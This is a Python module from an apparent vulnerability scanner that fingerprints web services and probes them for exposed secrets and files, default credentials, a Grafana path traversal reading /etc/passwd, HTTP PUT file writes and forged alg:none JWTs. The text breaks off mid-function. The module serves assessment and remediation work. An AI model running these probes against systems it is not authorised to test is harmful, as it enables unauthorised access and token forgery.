"""Web-facing service enumeration + deep checks (stdlib only).

Identifies every HTTP/HTTPS endpoint recce found - on ANY port, not just 80/443 -
fingerprints its tech stack, and runs a bounded set of high-signal checks: exposed
VCS/config files (.git/.env), server-status / Spring actuator, directory listing,
dangerous HTTP methods, weak cookie flags, and (via probes) the security-header / TLS
analysis. Everything positive becomes a Vuln, so web findings flow into the
Vulnerabilities / Verification / Exploitation sheets like anything else. Heavier
scanning is bridged to the Kali tools (whatweb / nikto / nuclei / gobuster / wpscan /
sslscan). Airgapped, stdlib only. Safety posture: see SECURITY.md.
"""

from __future__ import annotations

import base64
import difflib
import http.client
import json
import re
import ssl
import time
from urllib.parse import quote, urlencode, urljoin, urlparse

from .models import Host, Port, Vuln
from . import probes, proxy

_TIMEOUT = 6.0
_UA = "recce-web/1.0"


def is_web(port: Port) -> bool:
    return port.state == "open" and probes._is_http(port)


def scheme_for(port: Port) -> str:
    return "https" if probes._is_tls(port) else "http"


def url_for(ip: str, port: Port) -> str:
    sch = scheme_for(port)
    if (sch == "http" and port.portid == 80) or (sch == "https" and port.portid == 443):
        return f"{sch}://{ip}"
    return f"{sch}://{ip}:{port.portid}"


def _mk(ip: str, port: Port, sid: str, sev: str, title: str, cwes, output: str,
        remediation: str, confidence: str = "confirmed") -> Vuln:
    return Vuln(ip=ip, port=port.portid, protocol=port.protocol, script_id=sid,
                state="finding", title=title, output=output, severity=sev,
                cwes=list(cwes), source="web", remediation=remediation,
                confidence=confidence)


def _fetch(ip: str, port: Port, path: str = "/", method: str = "GET", read: int = 16384,
           auth: dict | None = None, body: str | None = None):
    """One request. Returns (status, headers_lower, body_text) or None on failure.
    `auth` supplies extra request headers (Cookie / Authorization / custom) so the
    scan can run as an authenticated user; `body` sends a request body (POST)."""
    use_tls = probes._is_tls(port)
    conn = None
    try:
        if use_tls:
            conn = http.client.HTTPSConnection(
                ip, port.portid, timeout=proxy.scaled(_TIMEOUT), context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(ip, port.portid, timeout=proxy.scaled(_TIMEOUT))
        req_headers = {"User-Agent": _UA, "Connection": "close", "Accept": "*/*"}
        if auth:
            req_headers.update(auth)
        if body is not None:
            req_headers.setdefault("Content-Type", "application/json")
        conn.request(method, path, body=body, headers=req_headers)
        resp = conn.getresponse()
        # Collapse duplicate headers (last wins) EXCEPT Set-Cookie, whose repeats are
        # each a distinct cookie - join them with newline so cookie/JWT analysis sees all.
        headers: dict = {}
        for k, v in resp.getheaders():
            lk = k.lower()
            if lk == "set-cookie" and lk in headers:
                headers[lk] += "\n" + v
            else:
                headers[lk] = v
        body = b""
        if method != "HEAD":
            body = resp.read(read)
        return resp.status, headers, body.decode("latin-1", "replace")
    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
        return None
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


# --- fingerprinting -------------------------------------------------------------

_TITLE = re.compile(r"<title[^>]*>(.*?)</title>", re.I | re.S)
_GENERATOR = re.compile(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)', re.I)
# body/header signatures -> technology label.
_TECH_BODY = [
    (re.compile(r"wp-content|wp-includes|wordpress", re.I), "WordPress"),
    (re.compile(r"Joomla!|/media/jui/", re.I), "Joomla"),
    (re.compile(r"Drupal.settings|/sites/default/", re.I), "Drupal"),
    (re.compile(r"csrf-param|content=\"Ruby on Rails", re.I), "Ruby on Rails"),
    (re.compile(r"__VIEWSTATE", re.I), "ASP.NET WebForms"),
    (re.compile(r"jenkins|X-Jenkins", re.I), "Jenkins"),
    (re.compile(r"grafana", re.I), "Grafana"),
    (re.compile(r"phpMyAdmin", re.I), "phpMyAdmin"),
    (re.compile(r"kc-context|/realms/|Keycloak", re.I), "Keycloak"),
    (re.compile(r'"cluster_name"|lucene_version|You Know, for Search', re.I), "Elasticsearch"),
    (re.compile(r"kbn-name|kbnConfig|Kibana", re.I), "Kibana"),
    (re.compile(r"MinIO Console|minio-", re.I), "MinIO"),
    (re.compile(r"RabbitMQ Management|rabbitmqadmin", re.I), "RabbitMQ"),
    (re.compile(r"Vault v[0-9]|x-vault-|api_addr", re.I), "HashiCorp Vault"),
]
_COOKIE_TECH = {"phpsessid": "PHP", "jsessionid": "Java/Servlet", "asp.net_sessionid": "ASP.NET",
                "laravel_session": "Laravel", "ci_session": "CodeIgniter", "django": "Django"}


def fingerprint(headers: dict, body: str) -> dict:
    tech: list[str] = []
    for h in ("server", "x-powered-by", "x-generator", "x-aspnet-version", "x-drupal-cache"):
        if headers.get(h):
            tech.append(f"{h}={headers[h]}")
    cookie = (headers.get("set-cookie") or "").lower()
    for name, label in _COOKIE_TECH.items():
        if name in cookie:
            tech.append(label)
    for rx, label in _TECH_BODY:
        if rx.search(body):
            tech.append(label)
    m = _GENERATOR.search(body)
    if m:
        tech.append(f"generator={m.group(1).strip()}")
    title = ""
    tm = _TITLE.search(body)
    if tm:
        title = re.sub(r"\s+", " ", tm.group(1)).strip()[:80]
    # dedupe, order-stable
    seen: set[str] = set()
    tech = [t for t in tech if not (t in seen or seen.add(t))]
    return {"tech": tech, "title": title}


def product_version(headers: dict, body: str) -> tuple[str, str]:
    """Best-effort (product, version) for CVE mapping, from headers/body. Used to
    enrich a port's product when nmap left it blank."""
    if headers.get("x-jenkins"):
        return "Jenkins", headers["x-jenkins"]
    if headers.get("x-confluence-request-time") or "Atlassian Confluence" in body:
        m = re.search(r"Confluence[^0-9]*([\d.]+)", body)
        return "Atlassian Confluence", (m.group(1) if m else "")
    if "gitlab" in (headers.get("x-gitlab-meta", "") + body[:2000]).lower():
        return "GitLab", ""
    # Elasticsearch root JSON: {"version":{"number":"7.10.2", ...}, "tagline":"You Know…"}
    if '"cluster_name"' in body or "You Know, for Search" in body:
        m = re.search(r'"number"\s*:\s*"([\d.]+)"', body)
        return "Elasticsearch", (m.group(1) if m else "")
    if headers.get("x-vault-version"):
        return "HashiCorp Vault", headers["x-vault-version"]
    m = _GENERATOR.search(body)
    if m:
        g = re.match(r"([A-Za-z][A-Za-z ]+?)\s*([\d][\d.]*)?\s*$", m.group(1).strip())
        if g:
            return g.group(1).strip(), (g.group(2) or "")
    m = re.search(r"([A-Za-z][\w.-]+)/([\d][\d.]+)", headers.get("server", ""))
    if m:
        return m.group(1), m.group(2)
    return "", ""


# --- secret extraction (redacted) ----------------------------------------------

_SECRET_RE = re.compile(
    r'([A-Za-z0-9_.\-]*(?:pass(?:word)?|secret|token|api[_-]?key|access[_-]?key|'
    r'private[_-]?key|db[_-]?pass|aws[_-]?\w+|client[_-]?secret)[A-Za-z0-9_.\-]*)'
    # flat  key=val / key: val   OR   Spring actuator nested  key:{"value":"val"}
    r'["\']?\s*[:=]\s*(?:\{?\s*["\']?value["\']?\s*:\s*)?["\']?([^\s"\',}{]{4,})', re.I)


def _looks_like_html(body: str) -> bool:
    """True when the body is an HTML document (a SPA/soft-404 index page), as opposed
    to a dotenv/config/source file. Used to reject a backup 'leak' that is really the
    app's index page. Deliberately does NOT treat raw '<?php' source as HTML."""
    head = body[:512].lstrip().lower()
    return (head.startswith("<!doctype html") or head.startswith("<html")
            or "<head" in head or "<body" in head)


def _leaked_secrets(body: str, limit: int = 8) -> list[str]:
    """Redacted 'key=ab…yz' pairs pulled from an exposed config/env body, so the
    finding shows WHAT leaked without dumping the raw secret."""
    out: list[str] = []
    for m in _SECRET_RE.finditer(body):
        key, val = m.group(1), m.group(2)
        red = f"{val[:2]}…{val[-2:]}" if len(val) > 6 else "…"
        pair = f"{key}={red}"
        if pair not in out:
            out.append(pair)
        if len(out) >= limit:
            break
    return out


# --- Spring Boot Actuator deep-dive --------------------------------------------
# Only probed when the base /actuator responds, so it costs nothing elsewhere.
_ACTUATOR_SUB = [
    ("actuator/env", "high", "web-actuator-env", "Actuator /env exposed (config + secrets)", True),
    ("actuator/configprops", "high", "web-actuator-configprops",
     "Actuator /configprops exposed (config + secrets)", True),
    ("actuator/heapdump", "high", "web-actuator-heapdump",
     "Actuator heapdump downloadable (full memory - secrets/tokens)", False),
    ("actuator/mappings", "medium", "web-actuator-mappings", "Actuator /mappings exposed (route map)", False),
    ("actuator/threaddump", "medium", "web-actuator-threaddump", "Actuator /threaddump exposed", False),
    ("actuator/gateway/routes", "high", "web-actuator-gateway",
     "Spring Cloud Gateway actuator exposed (SpEL RCE surface, CVE-2022-22947)", False),
]


def _scan_actuator(ip: str, port: Port, base_url: str, auth) -> list[Vuln]:
    root = _fetch(ip, port, "/actuator", auth=auth)
    if not (root and root[0] == 200 and ('"_links"' in root[2] or '"health"' in root[2])):
        return []
    out = [_mk(ip, port, "web-actuator", "high", "Spring Boot Actuator exposed (/actuator)",
               ["CWE-200"], f"GET {base_url}/actuator -> HTTP 200 (actuator index).",
               "Secure/limit the actuator endpoints (management.endpoints.web.exposure).")]
    for path, sev, sid, title, extract in _ACTUATOR_SUB:
        r = _fetch(ip, port, "/" + path, auth=auth)
        if not r or r[0] != 200:
            continue
        st, hd, bd = r
        if "heapdump" in path:
            ct = hd.get("content-type", "")
            if "octet-stream" not in ct and "HPROF" not in bd[:16] and "JAVA PROFILE" not in bd[:32]:
                continue
        detail = f"GET {base_url}/{path} -> HTTP {st}."
        if extract:
            secrets = _leaked_secrets(bd)
            if secrets:
                detail += "  leaked: " + "; ".join(secrets)
        out.append(_mk(ip, port, sid, sev, title, ["CWE-200"], detail,
                       "Disable or authenticate the actuator endpoints."))
    return out


# --- backup / source-file exposure ---------------------------------------------
_BACKUPS = [
    ("backup.zip", "zip"), ("site.zip", "zip"), ("www.zip", "zip"), ("backup.tar.gz", "gz"),
    ("backup.sql", "sql"), ("db.sql", "sql"), ("database.sql", "sql"), ("dump.sql", "sql"),
    (".env.bak", "secret"), (".env.save", "secret"), ("wp-config.php.bak", "php"),
    ("config.php.bak", "php"), ("web.config.bak", "xml"), ("index.php.bak", "php"),
]


def _confirm_backup(kind: str, body: str) -> bool:
    if kind == "zip":
        return body[:2] == "PK"
    if kind == "gz":
        return body[:2] == "\x1f\x8b"
    if kind == "sql":
        return bool(re.search(r"INSERT INTO|CREATE TABLE|MySQL dump|PostgreSQL database dump", body, re.I))
    # A 200-everything SPA serves index.html for /.env.bak etc.; if that HTML/JS
    # embeds a front-end config secret (apiKey:"..."), _leaked_secrets matched and we
    # reported the app's index page as an exposed backup. Reject bodies that are
    # clearly an HTML document before trusting a leaked-secret match.
    if _looks_like_html(body):
        return False
    if kind == "php":
        return "<?php" in body or bool(_leaked_secrets(body))
    if kind == "xml":
        return "<configuration" in body.lower()
    return bool(_leaked_secrets(body))


def _scan_backups(ip: str, port: Port, base_url: str, auth) -> list[Vuln]:
    out: list[Vuln] = []
    for name, kind in _BACKUPS:
        r = _fetch(ip, port, "/" + name, auth=auth)
        if r and r[0] == 200 and _confirm_backup(kind, r[2]):
            detail = f"GET {base_url}/{name} -> HTTP 200 ({kind})."
            if kind in ("secret", "php"):
                sec = _leaked_secrets(r[2])
                if sec:
                    detail += "  leaked: " + "; ".join(sec)
            out.append(_mk(ip, port, "web-backup", "high",
                           f"Exposed backup/source file: {name}", ["CWE-538"], detail,
                           "Remove backups/source from the web root; deny access."))
    return out


# --- opt-in default-credential probe (bounded, lockout-aware) -------------------
_BASIC_DEFAULTS = [("admin", "admin"), ("admin", "password"), ("tomcat", "tomcat"),
                   ("root", "root"), ("guest", "guest"), ("admin", "")]
_MAX_BASIC_TRIES = 5    # hard cap per endpoint - stays under common lockout thresholds


def _basic_auth_defaults(ip: str, port: Port, base_url: str, paths: list[str]) -> list[Vuln]:
    """Try a TINY documented default list against endpoints that ask for HTTP Basic
    auth. Capped at _MAX_BASIC_TRIES attempts per endpoint - well under lockout thresholds."""
    import base64
    out: list[Vuln] = []
    for path in paths:
        r = _fetch(ip, port, path)
        if not r or r[0] != 401 or "basic" not in r[1].get("www-authenticate", "").lower():
            continue
        for user, pw in _BASIC_DEFAULTS[:_MAX_BASIC_TRIES]:
            token = base64.b64encode(f"{user}:{pw}".encode()).decode()
            a = _fetch(ip, port, path, auth={"Authorization": f"Basic {token}"})
            # Only a 200 proves the credential was accepted. A 301/302 can be a
            # generic redirect (to a login page, or /admin -> /admin/) independent of
            # credential validity, so it is NOT proof - don't claim a confirmed finding.
            if a and a[0] == 200:
                out.append(_mk(ip, port, "web-default-creds", "high",
                               f"Default HTTP Basic credentials: {user}:{pw or '<blank>'}",
                               ["CWE-1392", "CWE-287"],
                               f"{base_url}{path} accepted {user}:{pw or '<blank>'} (HTTP {a[0]}).",
                               "Change the default credentials; restrict the endpoint."))
                break
    return out


# Form / JSON login apps that HTTP-Basic can't reach. Each descriptor names the login
# endpoint, how to serialise the credentials, and a success predicate. The whole probe
# is bounded (one attempt per documented default) and non-destructive - just a login.
# (id, tech-label from fingerprint, path, content-type, body-template, success, creds)
_APP_LOGINS = [
    {"id": "Grafana", "tech": "Grafana", "path": "/login", "ctype": "json",
     "body": '{{"user":"{u}","password":"{p}"}}',
     "ok": lambda s, b, h: s == 200 and ("logged in" in b.lower()
                                         or "grafana_session" in h.get("set-cookie", "")),
     "creds": [("admin", "admin")]},
    {"id": "MinIO", "tech": "MinIO", "path": "/api/v1/login", "ctype": "json",
     "body": '{{"accessKey":"{u}","secretKey":"{p}"}}',
     # Require a real auth artifact, not any Set-Cookie (a CSRF/anon cookie set on a
     # FAILED login) or the mere word "token" (e.g. an error like "invalid token").
     # A successful MinIO console login sets a `token=` session cookie / returns a
     # token value in the JSON body.
     "ok": lambda s, b, h: s in (200, 204) and (
         "token=" in h.get("set-cookie", "").lower()
         or bool(re.search(r'"(sessiontoken|token|sts)"\s*:\s*"[^"]+', b, re.I))),
     "creds": [("minioadmin", "minioadmin")]},
]


def _form_login_defaults(ip: str, port: Port, base_url: str, tech: list[str]) -> list[Vuln]:
    """Try one documented default per fingerprinted form/JSON-login app (Grafana, MinIO).
    Only runs for apps the fingerprint already matched, so it costs nothing otherwise.
    Non-destructive: a single login POST per default, well under any lockout threshold."""
    out: list[Vuln] = []
    tset = {t.lower() for t in tech}
    for app in _APP_LOGINS:
        if app["tech"].lower() not in tset:
            continue
        ctype = ("application/json" if app["ctype"] == "json"
                 else "application/x-www-form-urlencoded")
        for user, pw in app["creds"]:
            r = _fetch(ip, port, app["path"], method="POST",
                       body=app["body"].format(u=user, p=pw),
                       auth={"Content-Type": ctype})
            if not r:
                continue
            try:
                if app["ok"](r[0], r[2], r[1]):
                    out.append(_mk(ip, port, "web-default-creds", "critical",
                                   f"Default {app['id']} credentials accepted: {user}/{pw}",
                                   ["CWE-1392", "CWE-287"],
                                   f"POST {base_url}{app['path']} with {user}/{pw} "
                                   f"authenticated (HTTP {r[0]}).",
                                   "Change the default admin credentials immediately."))
                    break
            except Exception:  # noqa: BLE001 - a odd body never breaks the sweep
                continue
    return out


# --- high-signal exposure paths (GET, confirmed only on positive content) -------
# (path, severity, script_id, title, cwes, remediation, confirm(status, body))
_PATHS = [
    (".git/HEAD", "high", "web-git", "Exposed Git repository (.git) - source/secret disclosure",
     ["CWE-538"], "Deny access to .git and remove it from the web root.",
     lambda s, b: s == 200 and b.strip().startswith("ref:")),
    (".git/config", "high", "web-gitconfig", "Exposed .git/config (remote URL - may embed credentials)",
     ["CWE-538"], "Deny access to .git and remove it from the web root.",
     lambda s, b: s == 200 and "[core]" in b),
    (".env", "high", "web-dotenv", "Exposed .env file (app secrets / DB credentials)",
     ["CWE-538", "CWE-215"], "Move .env outside the web root; deny access.",
     lambda s, b: s == 200 and re.search(r"APP_KEY|DB_(PASSWORD|HOST|USER)|SECRET|API_?KEY", b, re.I)),
    (".svn/entries", "medium", "web-svn", "Exposed SVN metadata (.svn)",
     ["CWE-538"], "Remove .svn from the web root.",
     lambda s, b: s == 200 and b.split("\n", 1)[0].strip().isdigit()),
    ("server-status", "medium", "web-serverstatus", "Apache mod_status exposed (/server-status)",
     ["CWE-200"], "Restrict <Location /server-status> to localhost/admins.",
     lambda s, b: s == 200 and "Apache Server Status" in b),
    ("phpinfo.php", "medium", "web-phpinfo", "phpinfo() page exposed",
     ["CWE-200"], "Remove phpinfo() pages from production.",
     lambda s, b: s == 200 and "phpinfo()" in b.lower()),
    ("info.php", "medium", "web-phpinfo", "phpinfo() page exposed",
     ["CWE-200"], "Remove phpinfo() pages from production.",
     lambda s, b: s == 200 and "phpinfo()" in b.lower()),
    ("web.config", "medium", "web-webconfig", "IIS web.config readable",
     ["CWE-538"], "Deny direct access to web.config.",
     lambda s, b: s == 200 and "<configuration" in b.lower()),
    ("swagger.json", "info", "web-swagger", "API schema exposed (Swagger/OpenAPI)",
     ["CWE-200"], "Restrict API schema exposure if not intended public.",
     lambda s, b: s == 200 and ('"swagger"' in b or '"openapi"' in b)),
    ("manager/html", "medium", "web-tomcat-manager", "Apache Tomcat Manager reachable",
     ["CWE-1188"], "Restrict/authenticate the Tomcat Manager app.",
     # A bare 200/401/403 matched EVERY auth-gated or default-deny server (nginx 403,
     # site-wide basic auth) as "Tomcat Manager". Require a Tomcat signature: its own
     # manager app (200) and its default 401/403 error pages are branded "Apache
     # Tomcat", so a generic 401/403 from something else no longer qualifies.
     lambda s, b: s in (200, 401, 403) and "tomcat" in b.lower()),
    ("wp-login.php", "info", "web-wordpress", "WordPress login page (WordPress in use)",
     ["CWE-200"], "Ensure WordPress + plugins are current; restrict wp-login/xmlrpc.",
     lambda s, b: s == 200 and ("user_login" in b or "wordpress" in b.lower())),
    ("robots.txt", "info", "web-robots", "robots.txt discloses paths",
     ["CWE-200"], "Review Disallow entries (they hint at sensitive paths).",
     lambda s, b: s == 200 and "disallow" in b.lower()),
    # --- high-value exposures --------------------------------------------------
    (".DS_Store", "low", "web-dsstore", "Exposed .DS_Store (directory structure disclosure)",
     ["CWE-548"], "Remove .DS_Store from the web root; deny dotfiles.",
     lambda s, b: s == 200 and "Bud1" in b[:16]),
    ("crossdomain.xml", "medium", "web-crossdomain",
     "Permissive crossdomain.xml (wildcard allow-access-from)",
     ["CWE-942"], "Remove the wildcard; restrict allow-access-from to trusted domains.",
     lambda s, b: s == 200 and "cross-domain-policy" in b
     and bool(re.search(r'allow-access-from[^>]*domain="\*"', b))),
    ("metrics", "medium", "web-metrics", "Prometheus /metrics endpoint exposed",
     ["CWE-200"], "Restrict /metrics to the scraper - it leaks internal metrics/paths.",
     lambda s, b: s == 200 and ("# HELP" in b or "# TYPE" in b)),
    (".htpasswd", "high", "web-htpasswd", "Exposed .htpasswd (password hashes)",
     ["CWE-538"], "Deny access to .ht* files in the web server config.",
     lambda s, b: s == 200 and bool(re.search(r":\$(apr1|2[aby]|1|5|6)\$|:\{SHA\}", b))),
    ("server-info", "medium", "web-serverinfo", "Apache mod_info exposed (/server-info)",
     ["CWE-200"], "Restrict <Location /server-info> to localhost/admins.",
     lambda s, b: s == 200 and "Apache Server Information" in b),
    (".aws/credentials", "high", "web-aws", "Exposed AWS credentials file",
     ["CWE-538"], "Remove cloud creds from the web root and rotate them.",
     lambda s, b: s == 200 and "aws_access_key_id" in b.lower()),
    ("wp-json/wp/v2/users", "low", "web-wpusers", "WordPress user enumeration via REST API",
     ["CWE-200"], "Restrict the users REST endpoint / disable REST user listing.",
     lambda s, b: s == 200 and '"slug"' in b and b.lstrip().startswith("[")),
    # --- niche application exposures (tier 1) ----------------------------------
    ("script", "critical", "web-jenkins-script",
     "Jenkins Script Console reachable unauthenticated (Groovy RCE)",
     ["CWE-284", "CWE-94"],
     "Enable Jenkins security + matrix auth; never expose /script anonymously.",
     lambda s, b: s == 200 and ("Script Console" in b or "Jenkins.instance" in b
                                or 'name="script"' in b)),
    ("admin/master/console/", "medium", "web-keycloak-console",
     "Keycloak admin console reachable",
     ["CWE-284"],
     "Restrict the admin console to trusted networks / behind a VPN.",
     lambda s, b: s == 200 and ("Keycloak Administration" in b or "kc-context" in b
                                or "authServerUrl" in b or "adminBaseUrl" in b)),
    ("public/plugins/alertlist/../../../../../../../../etc/passwd", "high",
     "web-grafana-lfi",
     "Grafana plugin path traversal - arbitrary file read (CVE-2021-43798)",
     ["CWE-22"],
     "Upgrade Grafana to >= 8.3.1; restrict the plugin routes.",
     lambda s, b: s == 200 and bool(re.search(r"root:.*:0:0:", b))),
    ("v1/sys/seal-status", "low", "web-vault-status",
     "HashiCorp Vault reachable (seal status / version readable)",
     ["CWE-200"],
     "Restrict the Vault API to trusted clients; keep audit + auth enforced.",
     lambda s, b: s == 200 and '"sealed"' in b and '"version"' in b),
    ("_cat/indices?format=json", "high", "web-elastic-open",
     "Elasticsearch readable without authentication (data exposure)",
     ["CWE-306", "CWE-284"],
     "Enable the security realm (authentication) and bind to a trusted interface.",
     lambda s, b: s == 200 and b.lstrip()[:1] == "["
     and ('"health"' in b or '"index"' in b)),
    ("api/status", "info", "web-kibana",
     "Kibana status endpoint exposed (version disclosure)",
     ["CWE-200"],
     "Restrict Kibana; keep it patched (the version maps to known CVEs).",
     lambda s, b: s == 200 and '"version"' in b and "kibana" in b.lower()),
]

_DANGEROUS_METHODS = {"PUT", "DELETE", "TRACE", "CONNECT", "PATCH"}

# Cookie names that indicate a session / auth / anti-CSRF token (hardening matters most).
_SESSION_COOKIE = re.compile(r"sess|sid|auth|token|jwt|remember|login|sso|csrf", re.I)


def _cookie_findings(ip: str, port: Port, set_cookie_blob: str) -> list[Vuln]:
    """Per-cookie hygiene from the Set-Cookie header(s): HttpOnly, Secure, SameSite,
    __Host-/__Secure- prefix, cleartext-session transport, and over-broad Domain scope.
    Deduped by (cookie name, issue) so many cookies don't spam identical findings."""
    out: list[Vuln] = []
    if not set_cookie_blob:
        return out
    tls = probes._is_tls(port)
    seen: set = set()

    for line in set_cookie_blob.split("\n"):
        line = line.strip()
        if not line or "=" not in line:
            continue
        name = line.split("=", 1)[0].strip()
        low = line.lower()
        session = bool(_SESSION_COOKIE.search(name))

        def add(sev, title, cwes, fix):
            if (name, title) in seen:
                return
            seen.add((name, title))
            out.append(_mk(ip, port, "web-cookie", sev, f"{title}: {name}", cwes,
                           f"Set-Cookie: {line[:140]}", fix))

        if "httponly" not in low:
            add("low", "Cookie without HttpOnly", ["CWE-1004"],
                "Set HttpOnly so client-side JavaScript cannot read the cookie.")
        if tls and "secure" not in low:
            add("low", "Cookie without Secure (served over HTTPS)", ["CWE-614"],
                "Set the Secure flag so the cookie is only sent over HTTPS.")
        if "samesite" not in low:
            add("low", "Cookie without SameSite (CSRF / cross-site surface)",
                ["CWE-1275"], "Set SameSite=Lax (or Strict) to limit cross-site sending.")
        elif "samesite=none" in low and "secure" not in low:
            add("medium", "Cookie SameSite=None without Secure", ["CWE-1275"],
                "SameSite=None requires the Secure attribute; browsers reject it otherwise.")
        if session and not tls:
            add("medium", "Session cookie set over cleartext HTTP (token exposed on the wire)",
                ["CWE-319"], "Serve authentication over HTTPS + HSTS.")
        if session and not (name.startswith("__Host-") or name.startswith("__Secure-")):
            add("info", "Session cookie without __Host-/__Secure- prefix", ["CWE-1275"],
                "Prefix session cookies with __Host- to pin host + Secure + Path=/.")
        if re.search(r"domain=(\.[^;]+)", low):
            add("low", "Cookie scoped to a broad parent Domain", ["CWE-1275"],
                "Drop the leading-dot Domain; scope cookies to the exact host.")
    return out


def _prove_put(ip: str, port: Port, auth: dict | None):
    """Non-destructively prove HTTP PUT write: upload a unique marker file, read it
    back, then DELETE it. Returns (True, evidence) if it round-trips, (False, note) if
    PUT is advertised but rejected/unreadable, or None if the request failed."""
    name = "recce_put_probe.txt"
    marker = "recce-put-write-proof"
    put = _fetch(ip, port, "/" + name, method="PUT", body=marker, auth=auth)
    if not put:
        return None
    if put[0] not in (200, 201, 204):
        return False, f"PUT /{name} returned HTTP {put[0]} (advertised but not accepted)."
    got = _fetch(ip, port, "/" + name, method="GET", auth=auth)
    round_trips = bool(got and got[0] == 200 and marker in (got[2] or ""))
    _fetch(ip, port, "/" + name, method="DELETE", auth=auth)         # best-effort cleanup
    if round_trips:
        return True, (f"PUT /{name} -> HTTP {put[0]}; GET /{name} returned the uploaded "
                      f"marker '{marker}' -> arbitrary file write CONFIRMED "
                      "(probe file removed via DELETE).")
    return False, f"PUT /{name} returned {put[0]} but the file was not readable back."


# --- JWT weakness detection ------------------------------------------------------
# Passive: read the token from the response and flag the algorithm. Active: forge an
# alg:none variant (same claims + a harmless marker) and REPLAY it against the same
# path, comparing the response to the authenticated and anonymous baselines - a match
# to the authenticated view proves the server accepts unsigned, forgeable tokens.
_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*")
# name=eyJ... inside a Set-Cookie so we can replay the token in its real cookie.
_JWT_COOKIE_RE = re.compile(
    r"([A-Za-z0-9_.\-]+)=(eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*)")


def _b64url(seg: str):
    try:
        return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))
    except Exception:  # noqa: BLE001
        return None


def _b64url_enc(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _jwt_alg(token: str):
    raw = _b64url(token.split(".", 1)[0])
    if not raw:
        return None
    try:
        return str(json.loads(raw).get("alg", "")).lower()
    except Exception:  # noqa: BLE001
        return None


def _jwt_candidates(headers: dict, body: str):
    """Every JWT in the response, tagged with where it lives so we can replay it:
    ('cookie', name, tok) / ('authorization', None, tok) / ('body', None, tok)."""
    out, seen = [], set()
    for m in _JWT_COOKIE_RE.finditer(headers.get("set-cookie", "")):
        name, tok = m.group(1), m.group(2)
        if tok not in seen:
            seen.add(tok)
            out.append(("cookie", name, tok))
    for tok in _JWT_RE.findall(headers.get("authorization", "")):
        if tok not in seen:
            seen.add(tok)
            out.append(("authorization", None, tok))
    for tok in _JWT_RE.findall(body):
        if tok not in seen:
            seen.add(tok)
            out.append(("body", None, tok))
    return out


def _forge_none(token: str):
    """alg:none forgery of `token`: keep the original claims, add a harmless marker so
    that a server ACCEPTING it proves it never checked the signature (we changed the
    payload). Returns the forged compact JWT (empty signature) or None."""
    parts = token.split(".")
    if len(parts) < 2:
        return None
    payraw = _b64url(parts[1])
    if payraw is None:
        return None
    try:
        claims = json.loads(payraw)
    except Exception:  # noqa: BLE001
        return None
    if not isinstance(claims, dict):
        return None
    claims = dict(claims)
    claims["recce_probe"] = 1        # innocuous, non-authorization marker
    head = _b64url_enc(b'{"alg":"none","typ":"JWT"}')
    pay = _b64url_enc(json.dumps(claims, separators=(",", ":")).encode())
    return f"{head}.{pay}."


def _jwt_replay(ip: str, port: Port, path: str, loc: str, cookie_name, token):
    """Fetch `path` presenting `token` in the location it was observed in. token=None
    fetches anonymously (the logged-out baseline)."""
    if token is None:
        return _fetch(ip, port, path)
    if loc == "cookie" and cookie_name:
        return _fetch(ip, port, path, auth={"Cookie": f"{cookie_name}={token}"})
    return _fetch(ip, port, path, auth={"Authorization": f"Bearer {token}"})


def _resp_same(a, b) -> bool:
    """Two HTTP responses look like the same authorization outcome: same status and a
    body length within a small tolerance (page-to-page jitter, not a login redirect)."""
    if a is None or b is None:
        return False
    if a[0] != b[0]:
        return False
    la, lb = len(a[2]), len(b[2])
    return abs(la - lb) <= max(64, int(0.10 * max(la, lb, 1)))


def _prove_jwt_none(ip: str, port: Port, path: str, loc: str, cookie_name, token: str):
    """Actively prove the server accepts a forged alg:none token. Returns
    (verdict, evidence) where verdict is confirmed/rejected/inconclusive, or None if
    the proof could not run."""
    forged = _forge_none(token)
    if not forged:
        return None
    authed = _jwt_replay(ip, port, path, loc, cookie_name, token)
    anon = _jwt_replay(ip, port, path, loc, cookie_name, None)
    frg = _jwt_replay(ip, port, path, loc, cookie_name, forged)
    if not (authed and anon and frg):
        return None
    where = f"cookie {cookie_name}" if loc == "cookie" else "Authorization: Bearer"
    lens = (f"authed=HTTP {authed[0]}/{len(authed[2])}B  anon=HTTP {anon[0]}/{len(anon[2])}B  "
            f"forged=HTTP {frg[0]}/{len(frg[2])}B")
    if _resp_same(authed, anon):
        return ("inconclusive",
                f"GET {path} returned the same response with the real token, with no token, "
                f"and with the forged alg:none token ({lens}) - the endpoint isn't gated by "
                f"this token, so acceptance can't be proven here. Replay against a "
                f"token-gated path with jwt_tool -X a.")
    if _resp_same(frg, authed):
        return ("confirmed",
                f"Forged an unsigned token (header alg:none, original claims + a marker) and "
                f"replayed it via {where} against {path}. The server returned the same "
                f"authenticated response as the real token, and a different one with no token "
                f"({lens}) - the signature is not verified, so tokens are forgeable with any "
                f"claims (privilege escalation, account takeover).")
    if _resp_same(frg, anon):
        return ("rejected",
                f"Forged alg:none token replayed via {where} against {path} was treated like "
                f"no token at all ({lens}) - the server rejects unsigned tokens on this path.")
    return ("inconclusive",
            f"Forged alg:none token produced a distinct response from both the authenticated "
            f"and anonymous baselines ({lens}); couldn't classify. Confirm with jwt_tool -X a.")


def _scan_jwts(ip: str, port: Port, headers: dict, body: str,
               active: bool = False) -> list[Vuln]:
    out: list[Vuln] = []
    seen_alg: set[str] = set()
    for loc, cookie_name, tok in _jwt_candidates(headers, body):
        alg = _jwt_alg(tok)
        if alg is None:
            continue
        red = f"{tok[:12]}…{tok[-6:]}"
        if alg == "none":
            proof = _prove_jwt_none(ip, port, "/", loc, cookie_name, tok) if active else None
            if proof and proof[0] == "confirmed":
                out.append(_mk(ip, port, "web-jwt", "high",
                               "JWT alg:none accepted - forged unsigned token (proven)",
                               ["CWE-347"], proof[1],
                               "Reject 'none'; pin the expected algorithm server-side.",
                               confidence="confirmed"))
                continue
            if proof and proof[0] == "rejected":
                out.append(_mk(ip, port, "web-jwt", "info",
                               "JWT issued with alg:none (but forged token rejected)",
